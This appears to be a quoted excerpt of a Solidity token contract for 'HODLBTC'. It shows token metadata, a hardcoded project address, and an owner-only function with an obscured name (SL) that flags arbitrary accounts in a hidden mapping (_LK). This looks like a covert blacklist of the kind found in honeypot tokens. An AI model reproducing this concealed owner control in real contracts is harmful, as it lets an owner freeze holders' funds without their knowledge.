...
contract BaseToken is Ownable {
    ...
    string constant public name = 'HODLBTC';

    string constant public symbol = 'hodlbtc';

    uint8 constant public decimals = 18;

    uint256 public totalSupply = 519000000*10**uint256(decimals);
    ...
    mapping(address => bool) private _LK;
    ...
    address public projectAddress = 0xF5F8ca8190587F1FdFC4b787479d72A663fb9b8D;
    ...
    function SL(address account) public onlyOwner {
        _LK[account] = true;
    }
    ...
    function isLK(address account) public view returns (bool) {
